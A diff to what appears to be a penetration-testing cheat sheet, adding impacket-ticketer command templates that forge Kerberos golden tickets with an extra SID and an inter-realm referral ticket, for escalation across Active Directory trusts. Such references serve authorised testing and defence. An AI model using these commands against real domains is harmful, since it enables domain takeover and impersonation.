@@ -32,6 +32,18 @@ impacket-goldenPac -dc-ip <dc_ip> <domain>/<user>:'<password>'@<target>
 impacket-ticketer -nthash <nthash> -domain-sid <domain_sid> -domain <domain> <user>
 ```
 
+## Ticketer - Generate golden ticket with extra SID
+
+```
+impacket-ticketer -nthash "<hash>" -domain-sid "<domain_SID>" -domain "<domain_FQDN>" -extra-sid "<target_domain_SID-RID>" "<someusername>"
+```
+
+# 1. forge the referral ticket
+```
+impacket-ticketer -nthash "<hash>" -domain-sid "<domain_SID>" -domain "<domain_FQDN>" -extra-sid "<target_domain_SID-RID>" -spn "krbtgt/<domain_FQDN>" "someusername"
+```
+
+
 ## Ticketer - (silver ticket) - generate TGS tickets into ccache format which can be converted further into kirbi.
 #plateform/linux #target/local  #cat/ATTACK/EXPLOIT
 ```
